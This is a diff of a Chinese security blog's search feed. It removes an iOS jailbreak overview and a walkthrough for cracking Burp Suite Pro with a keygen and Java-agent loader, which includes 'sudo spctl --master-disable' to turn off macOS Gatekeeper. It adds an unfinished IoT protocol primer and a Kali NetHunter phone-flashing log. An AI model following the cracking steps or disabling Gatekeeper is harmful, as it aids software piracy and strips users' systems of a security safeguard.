-<h3 id="Semi-Untethered-Jailbreaks"><a href="#Semi-Untethered-Jailbreaks" class="headerlink" title="#Semi-Untethered Jailbreaks"></a><a class="link"   href="https://ios.cfw.guide/installing-palera1n/#semi-untethered-jailbreaks" ># <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>Semi-Untethered Jailbreaks</h3><hr>
-<p>Semi-untethered jailbreaks have been the most popular type of jailbreak in recent years. This type of jailbreak requires an exploit to be executed every time you reboot or turn off your device.</p>
-<p><figure class="image-caption"><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://ios.cfw.guide/assets/images/odysseymain.png"
-                      alt="A screenshot of the Odyssey jailbreak"
-                ><figcaption>A screenshot of the Odyssey jailbreak</figcaption></figure></p>
-<p>This jailbreak works by running the exploit through an app on the device itself. The app, however, must be resigned every 7 days if sideloaded with a standard Apple ID. Utilities like AltStore, ReProvision Reborn, and AltDaemon make this process far easier.</p>
-<p>Due to the nature of how the exploit is applied, these jailbreaks are easily removable through their respective app.</p>
-<p>A few examples of semi-untethered jailbreaks include <a class="link"   href="https://ios.cfw.guide/installing-taurine" >Taurine <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>, <a class="link"   href="https://ios.cfw.guide/installing-unc0ver" >unc0ver <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>, and <a class="link"   href="https://ios.cfw.guide/installing-odyssey" >Odyssey <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>.</p>
-<h3 id="Semi-Tethered-Jailbreaks"><a href="#Semi-Tethered-Jailbreaks" class="headerlink" title="#Semi-Tethered Jailbreaks"></a><a class="link"   href="https://ios.cfw.guide/installing-palera1n/#semi-tethered-jailbreaks" ># <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>Semi-Tethered Jailbreaks</h3><hr>
-<p>Semi-tethered jailbreaks are very similar to semi-untethered jailbreaks, however the exploit must be ran using a computer rather than using a sideloaded app.</p>
-<p><figure class="image-caption"><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://ios.cfw.guide/assets/images/checkra1n.png"
-                      alt="A screenshot of the checkra1n jailbreak"
-                ><figcaption>A screenshot of the checkra1n jailbreak</figcaption></figure></p>
-<p>Due to requiring a computer to rejailbreak after every reboot, most choose to use a semi-untethered jailbreak instead.</p>
-<p>An example of a semi-tethered jailbreak is <a class="link"   href="https://ios.cfw.guide/installing-odysseyra1n" >Odysseyra1n <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>.</p>
-<h3 id="Tethered-Jailbreaks"><a href="#Tethered-Jailbreaks" class="headerlink" title="#Tethered Jailbreaks"></a><a class="link"   href="https://ios.cfw.guide/installing-palera1n/#tethered-jailbreaks" ># <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>Tethered Jailbreaks</h3><hr>
-<p>Tethered jailbreaks are not meant to be used by the general public. These exploits modify the device in a way that it requires a PC to even boot at all, even without a jailbreak.</p>
-<p>Because of this, these tend to only be used by jailbreak developers getting ready for a newer version of iOS.</p>
-<p>越狱工具-》适用于不同版本手机和ios版本</p>
-]]></content>
-  </entry>
-  <entry>
-    <title>破解，再给新下载的burp加个快捷方式</title>
-    <url>/2023/04/23/%E7%A0%B4%E8%A7%A3%EF%BC%8C%E5%86%8D%E7%BB%99%E6%96%B0%E4%B8%8B%E8%BD%BD%E7%9A%84burp%E5%8A%A0%E4%B8%AA%E5%BF%AB%E6%8D%B7%E6%96%B9%E5%BC%8F/</url>
-    <content><![CDATA[<blockquote>
-<p>拜托，有个双击就可以打开的burp真的很酷好吗？</p>
-</blockquote>
-<p>咱就是说，在kali和mac上使用burp有那么些不自然</p>
-<h2 id="破解"><a href="#破解" class="headerlink" title="破解"></a>破解</h2><p>通常呢，咱们都是在52破解下载最新版的burpsuite<br><a class="link"   href="https://down.52pojie.cn/Tools/Network_Analyzer/Burp_Suite_Pro_v2022.2.2_Loader_Keygen.zip" >https://down.52pojie.cn/Tools/Network_Analyzer&#x2F;Burp_Suite_Pro_v2022.2.2_Loader_Keygen.zip <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
-<p>但52破解的破解器总是用的1.7版本，有些功能真的跟不上</p>
-<p>所以，咱们直接从官方下载正式版的pro<br>然后去全球最大的同性交友网站找到最新的keygen<br>之后怎么做不用我介绍了吧<br>之后的破解流程就没啥好说的了，破解器作者已经表述得很详尽了</p>
-<p>下载链接留这里<br>burpsuite pro：<a class="link"   href="https://portswigger.net/burp/pro" >https://portswigger.net/burp/pro <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br>Keygen：<a class="link"   href="https://github.com/h3110w0r1d-y/BurpLoaderKeygen/releases" >https://github.com/h3110w0r1d-y/BurpLoaderKeygen/releases <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
-<h2 id="制作快捷方式"><a href="#制作快捷方式" class="headerlink" title="制作快捷方式"></a>制作快捷方式</h2><p>把文件移动到&#x2F;usr&#x2F;bin目录中</p>
-<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">mv</span> BurpLoaderKeygen.jar burpsuite_pro_v2022.2.2.jar /usr/bin</span><br></pre></td></tr></table></figure></div>
-
-<p>先删掉免费的社区版本</p>
-<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">apt remove burpsuite</span><br></pre></td></tr></table></figure></div>
-
-<p>配置快捷方式:<br>在&#x2F;usr&#x2F;bin下创建burpsuite</p>
-<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">vim burpsuite</span><br></pre></td></tr></table></figure></div>
-
-<p>将keygen上的loader commond复制粘贴</p>
-<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line">/usr/lib/jvm/java-17-openjdk-amd64/bin/java --add-opens=java.desktop/javax.swing=ALL-UNNAMED --add-opens=java.base/java.lang=ALL-UNNAMED -javaagent:/usr/bin/BurpLoaderKeygen.jar -noverify -jar /usr/bin/burpsuite_pro_v2022.2.2.jar</span><br></pre></td></tr></table></figure></div>
-
-<p>增加执行权限,进入&#x2F;usr&#x2F;share&#x2F;applications，创建并编辑burpsuite的快捷方式</p>
-<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">chmod</span> +x burpsuite</span><br><span class="line"><span class="built_in">cd</span> /usr/share/applications/</span><br><span class="line">vim burpsuite.desktop</span><br></pre></td></tr></table></figure></div>
-
-<p>填入代码</p>
-<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">[Desktop Entry]</span><br><span class="line">Name=burpsuite</span><br><span class="line">Encoding=UTF-8</span><br><span class="line">Exec=sh -c <span class="string">&quot;/usr/bin/burpsuite&quot;</span></span><br><span class="line">Icon=kali-burpsuite</span><br><span class="line">StartupNotify=<span class="literal">false</span></span><br><span class="line">Terminal=<span class="literal">false</span></span><br><span class="line">Type=Application</span><br><span class="line">Categories=03-webapp-analysisc;03-06-web-application-proxies;</span><br><span class="line">X-Kali-Package=burpsuite</span><br></pre></td></tr></table></figure></div>
-
-<p>ok</p>
-<h2 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h2><p>2022.9版本的破解有些改变，根据沈沉舟大佬的描述：</p>
-<blockquote>
-<p>“2022.9版注册机制并未发生变化，仅仅是相关代码具体实现做了微调，导致class的字节码发生变化，而旧版loader模式匹配时约束条件太强，兼容性不足。”</p>
-</blockquote>
-<p>故新版本的破解流程稍有更改</p>
-<p>首先把需要的部分下载一下，我用的是mac，理论上比linux和win那边麻烦点（实际操作的时候也是很麻烦）  </p>
-<p>安装好app后，右键查看包内容，把loader和keygen移动到app路径下，主要是放在burpsuite旁边  </p>
-<p>由于这个loader名字太难打，咱直接改名burploader<br>右键打开terminal，命令启动burpsuite和keygen</p>
-<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">java -jar BurpLoaderKeygen.jar</span><br></pre></td></tr></table></figure></div>
-
-<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">java -javaagent:burploader.jar -noverify -jar burpsuite_pro.jar</span><br></pre></td></tr></table></figure></div>
-
-<p>后面注册的过程都是一样的，咱直接跳到关键过程<br>注册成功后从启动台打开还是app还是没注册的样子  </p>
-<p>咱还是进入包内容，添加点内容</p>
-<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">-javaagent:burploader.jar</span><br><span class="line">-noverify</span><br></pre></td></tr></table></figure></div>
-
-<p>之后就可以正常打开了</p>
-<p>P.S.<br>关于mac更新时遇到的那些操作<br>安装新版本前务必删除全部相关文件  </p>
-<p>苹果的安全机制，修改包内容后会遇到文件损坏的报错<br>这个时候直接</p>
-<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">sudo spctl --master-disable</span><br></pre></td></tr></table></figure></div>
-
-
-<p>就完事了  </p>
-]]></content>
-  </entry>
-  <entry>
     <title>红队的夜行衣——反反制的那些事</title>
     <url>/2023/06/12/%E7%BA%A2%E9%98%9F%E7%9A%84%E5%A4%9C%E8%A1%8C%E8%A1%A3%E2%80%94%E2%80%94%E5%8F%8D%E5%8F%8D%E5%88%B6%E7%9A%84%E9%82%A3%E4%BA%9B%E4%BA%8B/</url>
     <content><![CDATA[<blockquote>
@@ -1254,6 +1154,106 @@ FireFox不需要扩展，直接配置就比上面那些搞扩展的好使。</li
 <blockquote>
 <p>参考：<br><a class="link"   href="https://mp.weixin.qq.com/s/A5dd7WXojGBzsz52_iLtJQ" >https://mp.weixin.qq.com/s/A5dd7WXojGBzsz52_iLtJQ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br><a class="link"   href="https://cloud.tencent.com/developer/article/1857034" >https://cloud.tencent.com/developer/article/1857034 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br><a class="link"   href="https://cloud.tencent.com/document/product/583/9694" >https://cloud.tencent.com/document/product/583/9694 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br><a class="link"   href="https://www.cnblogs.com/supdon/p/15099742.html" >https://www.cnblogs.com/supdon/p/15099742.html <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br><a class="link"   href="https://github.com/shimmeris/SCFProxy/blob/main/README_zh.md" >https://github.com/shimmeris/SCFProxy/blob/main/README_zh.md <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br><a class="link"   href="https://qust.me/post/m[sm8916](https://acg.tv/sm8916)/" >https://qust.me/post/m[sm8916](https://acg.tv/sm8916)/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
 </blockquote>
+]]></content>
+  </entry>
+  <entry>
+    <title>由智能家居入门物联网安全（没写完，是个半成品</title>
+    <url>/2023/04/23/%E7%94%B1%E6%99%BA%E8%83%BD%E5%AE%B6%E5%B1%85%E5%85%A5%E9%97%A8%E7%89%A9%E8%81%94%E7%BD%91%E5%AE%89%E5%85%A8/</url>
+    <content><![CDATA[<h2 id="何为智能家居"><a href="#何为智能家居" class="headerlink" title="何为智能家居"></a>何为智能家居</h2><p>智能家居（smart home, home automation）是以住宅为平台，利用综合布线技术、网络通信技术、 安全防范技术、自动控制技术、音视频技术将家居生活有关的设施集成，构建高效的住宅设施与家庭日程事务的管理系统，提升家居安全性、便利性、舒适性、艺术性，并实现环保节能的居住环境。</p>
+<h2 id="何为物联网"><a href="#何为物联网" class="headerlink" title="何为物联网"></a>何为物联网</h2><p>物联网技术（Internet of Things，IoT）起源于传媒领域，是信息科技产业的第三次革命。物联网是指通过信息传感设备，按约定的协议，将任何物体与网络相连接，物体通过信息传播媒介进行信息交换和通信，以实现智能化识别、定位、跟踪、监管等功能。</p>
+<h2 id="智能家居用到的通信协议"><a href="#智能家居用到的通信协议" class="headerlink" title="智能家居用到的通信协议"></a>智能家居用到的通信协议</h2><p>无线协议</p>
+<p>一、Wifi技术</p>
+<p>　　生活中最常见的无线协议。采用的是国内2.4G免费频段，直接连入互联网，手机下载APP，就可以直接进行控制。Wifi最初就是为了实现大数据在小范围内的无线传输而设计的，所以设计之初并没有考虑其他的因素。以至于应用到目前智能家居系统并不是很合适。Wifi只支持星型网络拓扑结构，通过多基站的方式实现网络空间拓展。协议稳定性、安全性比较差，容易断开连接，被人破解。wifi在功率消耗上面能耗巨大，假如家里面安装了许多的wifi产品，那么一个月下来用电量都不可小视。Wifi设计只有16个信道，而且其中有一个是占用的，理论上是可以连接15个产品但是实际中连接10个就极不稳定了。一个家庭产品上面远远不止10个。Wifi的穿墙能力和衍射能力较弱等等，这些方面就足以说明wifi不适合做智能家居系统。</p>
+<p>　　二、蓝牙技术</p>
+<p>　　蓝牙也是生活中最常见的协议，接触最多的就是手机蓝牙配对和蓝牙音箱了，通过短距离的无线通讯，可以传输大数据，为生活带来了许多便捷之处。蓝牙的功耗低于wifi，传输距离较近，一般低于10米，无法进行组网，其次蓝牙堆栈(stack)很容易奔溃。蓝牙节点也比较少，在稳定性和受干扰能力方面也不是很强。所以不适合做成智能家居系统。</p>
+<p>　　三、射频433</p>
+<p>　　433MHz的显著优势是无线信号的穿透性强、能够传播得更远。但其缺点也是很明显的，就是其数据传输速率只有9600bps，因此433Mhz技术一般只适用于数据传输量较少的应用场合。从通讯可靠性的角度来讲，433Mhz技术和WiFi一样，只支持星型网络的拓扑结构，通过多基站的方式实现网络覆盖空间的扩展，因此其无线通讯的可靠性和稳定性也逊于Z-Wave与Zigbee技术。另外，不同于Z-Wave，Zigbee和WiFi技术中所采用的加密功能，433MHZ系统，它的致命弱点是系统安全保密性差，很容易被攻击，被破译。</p>
+<p>　　四、z-wave协议</p>
+<p>　　Zwave的数据传输速率为9.6kbps，信号的有效覆盖在室内30米（室外大于100米），适用于窄带宽应用场合，且具备一定的安全性和稳定性，不过目前只应用于家庭自动化方面。究其缺点主要有三个：①是节点较少，理论值为256个，实际值可能只有150个左右，算是其能容纳设备数量的上限，实际上很多厂商能做到容纳20、30个设备就不错了。②是树状组网结构，一旦树枝上端断掉，下端的所有设备将无法与网关通信。③是没有加密方式，安全性差，易受到攻击。（Zwave所用频段在我国是非民用的，国内Zwave智能家居并不常见，更多的还是应用在国外。）</p>
+<p>　　五、ZigBee协议</p>
+<p>　　在智能家居领域，ZigBee协议是公认的目前最适合的协议之一。Zigbee具备双向通讯的能力，不仅能发送命令到设备，同时设备也会把执行状态反馈回来，这对终端使用体验至关重要，尤其是安防设备，倘若你点击了关门，却不知道门是否真的已经锁上，将会带来多大的安全隐患；此外，Zigbee采用了极低功耗设计，可以全电池供电，理论上一节电池能使用10年以上，节能环保。ZigBee介质存取层网络拓扑结构多样，分为星状拓扑结构，树状拓扑结构和网状拓扑结构。在信号传输方面，ZigBee的每一个产品都是一个中继器，产品之间信号可以连跳7次，所以ZigBee协议节点具有多达65000个，但是实际应用中200-300个节点时稳定性上就会衰减。ZigBee网络节点不仅本身可以作为监控对象，还可以自动中转别的网络节点传过来的数据资料。采用扩频技术对ZigBee的抗干扰能力进行改进和完善，可以起到避开干扰的作用。当系统网络受到干扰时，整个网络整以动态的方式切换到另一信道上。在安全性上面采用AES128位高级加密法，确保了整个系统的安全可靠。</p>
+<p>　　综上所述：ZigBee协议具有自组网能力，安全性、可靠性高，抗干扰能力，自我恢复能力都比较强。具有极低的功耗，因此也是目前国内最适合智能家居的无线通讯协议。</p>
+<p>　　6、EnOcean：2012年3月，国际电工技术委员会将EnOcean无线通信标准采纳为国际标准“ISO&#x2F;IEC 14543-3-10”[1] ，这也是世界上唯一使用能量采集技术的无线国际标准。</p>
+<p>　　EnOcean技术和同类技术相比，功耗最低，传输距离最远，可以组网并且支持中继等功能，主要应用在一些无线无源智能家居和智能楼宇产品上。</p>
+<p>　　7、Lora：LoRa 是LPWAN通信技术中的一种，是美国Semtech公司采用和推广的一种基于扩频技术的超远距离无线传输方案。这一方案改变了以往关于传输距离与功耗的折衷考虑方式，为用户提供一种简单的能实现远距离、长电池寿命、大容量的系统，进而扩展传感网络。目前，LoRa 主要在全球免费频段运行，包括433、868、915 MHz等。</p>
+<p>　　LoRa技术具有远距离、低功耗（电池寿命长）、多节点、低成本的特性。</p>
+<p>　　8、NB-IOT：基于蜂窝的窄带物联网（Narrow Band Internet of Things, NB-IoT）,NB-IoT构建于蜂窝网络，只消耗大约180KHz的带宽，可直接部署于GSM网络、UMTS网络或LTE网络，以降低部署成本、实现平滑升级。</p>
+<p>　　NB-IoT是IoT领域一个新兴的技术，支持低功耗设备在广域网的蜂窝数据连接，也被叫作低功耗广域网(LPWAN)。NB-IoT支持待机时间长、对网络连接要求较高设备的高效连接。据说NB-IoT设备电池寿命可以提高至至少10年，同时还能提供非常全面的室内蜂窝数据连接覆盖。</p>
+<p>　　NB-IoT具备四大特点：一是广覆盖，将提供改进的室内覆盖，在同样的频段下，NB-IoT比现有的网络增益20dB，相当于提升了100倍覆盖区域的能力；二是具备支撑海量连接的能力，NB-IoT一个扇区能够支持10万个连接，支持低延时敏感度、超低的设备成本、低设备功耗和优化的网络架构；三是更低功耗，NB-IoT终端模块的待机时间可长达10年；四是更低的模块成本，企业预期的单个接连模块不超过5美元。</p>
+<p>　　NB-IOT聚焦于低功耗广覆盖（LPWA）物联网（IOT）市场，是一种可在全球范围内广泛应用的新兴技术。其具有覆盖广、连接多、速率低、成本低、功耗低、架构优等特点。NB-IOT使用License频段，可采取带内、保护带或独立载波三种部署方式，与现有网络共存。</p>
+<p>有线协议</p>
+<p>1、RS485：RS-485又名TIA-485-A, ANSI&#x2F;TIA&#x2F;EIA-485或TIA&#x2F;EIA-485。</p>
+<p>　　RS485是一个定义平衡数字多点系统中的驱动器和接收器的电气特性的标准，该标准由电信行业协会和电子工业联盟定义。使用该标准的数字通信网络能在远距离条件下以及电子噪声大的环境下有效传输信号。RS-485使得廉价本地网络以及多支路通信链路的配置成为可能。</p>
+<p>　　RS485有两线制和四线制两种接线，四线制只能实现点对点的通信方式，现很少采用，现在多采用的是两线制接线方式，这种接线方式为总线式拓扑结构，在同一总线上最多可以挂接32个节点。</p>
+<p>　　很多主流的有线智能家居厂家采用的都是RS485协议。</p>
+<p>　　2、RS232：个人计算机上的通讯接口之一，由电子工业协会所制定的异步传输标准接口。通常 RS-232 接口以9个引脚 (DB-9) 或是25个引脚 (DB-25) 的型态出现，一般个人计算机上会有两组 RS-232 接口，分别称为 COM1 和 COM2。很多老式电脑的接口用的就是这种通讯协议。少数的智能家居产品会采用这种协议。</p>
+<p>　　3、Modbus：Modbus是由Modicon（现为施耐德电气公司的一个品牌）在1979年发明的，是全球第一个真正用于工业现场的总线协议。</p>
+<p>　　ModBus网络是一个工业通信系统，由带智能终端的可编程序控制器和计算机通过公用线路或局部专用线路连接而成。其系统结构既包括硬件、亦包括软件。它可应用于各种数据采集和过程监控。</p>
+<p>　　ModBus网络只有一个主机，所有通信都由他发出。网络可支持247个之多的远程从属控制器，但实际所支持的从机数要由所用通信设备决定。采用这个系统，各PC可以和中心主机交换信息而不影响各PC执行本身的控制任务。</p>
+<p>　　4、KNX：1999年5月，欧洲三大总线协议EIB、BatiBus和EHSA合并成立了Konnex协会，提出了KNX协议。该协议以EIB为基础，兼顾了BatiBus和EHSA的物理层规范，并吸收了BatiBus和EHSA中配置模式等优点，提供了家庭、楼宇自动化的完整解决方案。</p>
+<p>　　KNX 总线是独立于制造商和应用领域的系统。 通过所有的总线设备连接到 KNX 介质上 ( 这些介质包括双绞线、射频、电力线或 IP&#x2F;Ethernet), 它们可以进行信息交换。总线设备可以是传感器也可以是执行器，用于控制楼宇管理装置如： 照明 , 、遮光 &#x2F; 百叶窗、保安系统、能源管理、 供暖、通风、空调系统、信号和监控系统、服务界面及楼宇控制系统、远程控制、计量、视频 &#x2F; 音频控制、大型家电等。所有这些功能通过一个统一的系统就可以进行控制、监视和发送信号，不需要额外的控制中心。</p>
+<h2 id="了解ZigBee协议"><a href="#了解ZigBee协议" class="headerlink" title="了解ZigBee协议"></a>了解ZigBee协议</h2><h2 id="了解MQTT协议"><a href="#了解MQTT协议" class="headerlink" title="了解MQTT协议"></a>了解MQTT协议</h2><h2 id="中控系统"><a href="#中控系统" class="headerlink" title="中控系统"></a>中控系统</h2><h2 id="中控系统的搭建"><a href="#中控系统的搭建" class="headerlink" title="中控系统的搭建"></a>中控系统的搭建</h2><h2 id="环境中存在的隐患"><a href="#环境中存在的隐患" class="headerlink" title="环境中存在的隐患"></a>环境中存在的隐患</h2><h2 id="思考"><a href="#思考" class="headerlink" title="思考"></a>思考</h2><p>没写完，是个半成品</p>
+<blockquote>
+<p>参考：</p>
+</blockquote>
+<p><a class="link"   href="https://baike.baidu.com/item/%E6%99%BA%E8%83%BD%E5%AE%B6%E5%B1%85/686345?fr=aladdin" >https://baike.baidu.com/item/%E6%99%BA%E8%83%BD%E5%AE%B6%E5%B1%85/686345?fr=aladdin <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+]]></content>
+  </entry>
+  <entry>
+    <title>简单记录pixel 3XL刷KaliNetHunter的过程</title>
+    <url>/2023/04/23/%E7%AE%80%E5%8D%95%E8%AE%B0%E5%BD%95pixel-3XL%E5%88%B7KaliNetHunter%E7%9A%84%E8%BF%87%E7%A8%8B/</url>
+    <content><![CDATA[<h2 id="首先"><a href="#首先" class="headerlink" title="首先"></a>首先</h2><p>根据kali官方介绍，目前已有大佬开发出相应的kernel用来支持kalinethunter的安装<br><a class="link"   href="https://nethunter.kali.org/kernels.html" >https://nethunter.kali.org/kernels.html <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://github.com/BrathonBai/ImgHS/raw/main/content/pixel_kali/Pasted image 20230327192859.1x5kw9e5q1gg.webp"
+                      alt="Pasted image 20230327192859" 
+                ><figcaption>Pasted image 20230327192859</figcaption></figure></p>
+<p>我的pixel3XL刚好就在这里<br>那就好办了，<br>看看环境需求：<br>刷原生Android12，刷大佬的kernel<br>看看大佬的介绍页怎么写的：<br><a class="link"   href="https://forum.xda-developers.com/t/kernel-nethunter-for-pixel-3-and-pixel-3-xl-blueline-crosshatch.4456799/" >https://forum.xda-developers.com/t/kernel-nethunter-for-pixel-3-and-pixel-3-xl-blueline-crosshatch.4456799/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://github.com/BrathonBai/ImgHS/raw/main/content/pixel_kali/Pasted image 20230327193057.2i6h1bvt4zs0.webp"
+                      alt="Pasted image 20230327193057" 
+                ><figcaption>Pasted image 20230327193057</figcaption></figure></p>
+<p>需要先用twrp把他的kernel相关文件刷进去<br>然后安装busybox<br>安装Wireless_firmware.zip<br>安装nethunter相关软件<br>升级<br>重启</p>
+<p>再看看大佬的gayhub<br><a class="link"   href="https://github.com/V3rB0se/Alynx-Nethunter" >https://github.com/V3rB0se/Alynx-Nethunter <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://github.com/BrathonBai/ImgHS/raw/main/content/pixel_kali/Pasted image 20230327194001.5295ygwtwsw0.webp"
+                      alt="Pasted image 20230327194001" 
+                ><figcaption>Pasted image 20230327194001</figcaption></figure></p>
+<p>那就好办了，需要的文件都提供了，开搞！</p>
+<p>twrp的安装本身是个问题，因为官方也说了，安不进去，需要了刷两遍，前提是刷进第三方系统<br><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://github.com/BrathonBai/ImgHS/raw/main/content/pixel_kali/Pasted image 20230327192630.4u3n6zytawa0.webp"
+                      alt="Pasted image 20230327192630" 
+                ><figcaption>Pasted image 20230327192630</figcaption></figure></p>
+<p>那我就用lineageos先搞一下，避免之后不能root</p>
+<h2 id="操作"><a href="#操作" class="headerlink" title="操作"></a>操作</h2><h3 id="刷第三方系统"><a href="#刷第三方系统" class="headerlink" title="刷第三方系统"></a>刷第三方系统</h3><p>根据LineageOS安装引导，<br>下载对应版本的img和zip，准备导入</p>
+<p>重启至bootloader</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">adb reboot bootloader</span><br></pre></td></tr></table></figure></div>
+
+<p>刷镜像进去</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">fastboot flash boot &lt;name&gt;.img</span><br></pre></td></tr></table></figure></div>
+
+<p>然后重启到Recovery Mod<br>点击Factory Reset，再Format data &#x2F; factory reset，恢复出厂设置，格式化数据<br>回到主菜单，找 Apply from ADB</p>
+<p>然后侧载文件</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">adb sideload &lt;name&gt;.zip</span><br></pre></td></tr></table></figure></div>
+<p>侧载结束，第三方系统安装完毕，准备安装twrp</p>
+<h3 id="刷twrp"><a href="#刷twrp" class="headerlink" title="刷twrp"></a>刷twrp</h3><p>twrp的安装稍微又些棘手，不过可以借用lineageOS的boot来解决。<br>同样是使用侧载功能</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">adb sideload twrp.img</span><br></pre></td></tr></table></figure></div>
+<p>这样安装的twrp是可以使用的，但会覆盖掉lineageOS的分区，此时就要注意<br>twrp侧载安装会覆盖a、b两个分区，所以之后又要用LineageOS的img再刷一次，以保证系统的正常启动。</p>
+<p>twrp侧载之后，使用adb，将后续需要安装的包一股脑全都放进去</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">adb push &lt;要导入的包&gt; /path</span><br></pre></td></tr></table></figure></div>
+<p>这里包括Alynx-12-nethunter-bluecross.zip、Wireless_firmware.zip、Magisk-v25.2.apk</p>
+<p>由于twrp已经覆盖了a、b两个区，后续启动是个问题，用fastboot再次覆盖安装lineageOS<br>就可以引导启动系统，并开始Magisk的操作</p>
+<p>启动Magick app，修复引导镜像，<br>使用adb把镜像拉到pc上，</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">adb pull &lt;magick-什么玩应来着&gt;.img</span><br></pre></td></tr></table></figure></div>
+<p>使用fastboot，把这个镜像安装到recovery区</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">fastboot flash recovery &lt;magick-什么玩应来着&gt;.img</span><br></pre></td></tr></table></figure></div>
+
+<p>再次启动系统，应该就能root了</p>
+<p>然后再看F-Droid这个app，进入后安装nethunter store<br>后面的懒得教了，一看就知道<br>大不了全装了</p>
 ]]></content>
   </entry>
 </search>
